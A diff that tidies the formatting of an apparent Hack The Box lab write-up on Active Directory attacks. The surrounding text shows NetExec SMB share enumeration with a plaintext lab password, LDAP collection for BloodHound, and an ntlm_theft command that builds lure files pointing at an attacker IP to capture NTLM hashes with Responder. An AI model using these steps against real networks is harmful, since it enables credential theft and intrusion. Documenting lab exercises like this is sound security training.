@@ -92,12 +92,14 @@ nxc smb 10.1.239.192 --generate-hosts-file hosts
 [🔴][Feb 03, 2026 - 00:42:02 (CET)] exegol-htb Lumon #
 ````
 ### Enumerating SMB Shares
-#### Using valid domain credentials, SMB enumeration was performed against both hosts simultaneously.
+
+Using valid domain credentials, SMB enumeration was performed against both hosts simultaneously.
 
 ```
 nxc smb ips -u hellyr -p 'H3lenaR!2025'
 ```
-#### To enumerate available SMB shares and their permissions, the --shares option was used.
+
+To enumerate available SMB shares and their permissions, the `--shares` option was used.
 ```
 nxc smb ips -u hellyr -p 'H3lenaR!2025' --shares
 ```
@@ -109,9 +111,9 @@ nxc smb ips -u hellyr -p 'H3lenaR!2025' --shares
 
 ## LLMNR / SMB Exploitation Attempt
 
-#### Discovering write access on a non-default SMB share raised the possibility of placing a malicious file (such as a .lnk shortcut) to trigger outbound authentication and capture credentials via NTLM relay or hash capture.
+Discovering write access on a non-default SMB share raised the possibility of placing a malicious file (such as a .lnk shortcut) to trigger outbound authentication and capture credentials via NTLM relay or hash capture.
 
-#### An initial attempt was made to capture authentication traffic using Responder and ntlm-theft .
+An initial attempt was made to capture authentication traffic using Responder and ntlm-theft.
 
 ```
 ntlm_theft.py --verbose --generate modern --server "10.200.33.160" --filename "meetingXYZ"
@@ -199,7 +201,7 @@ nxc smb 10.1.42.32 -u harmonyc -p 'pass.txt' --users
 
 
 
-### ldap collectiong whit nxc for bloodhound 
+### LDAP collection with nxc for BloodHound 
 
 
 ```
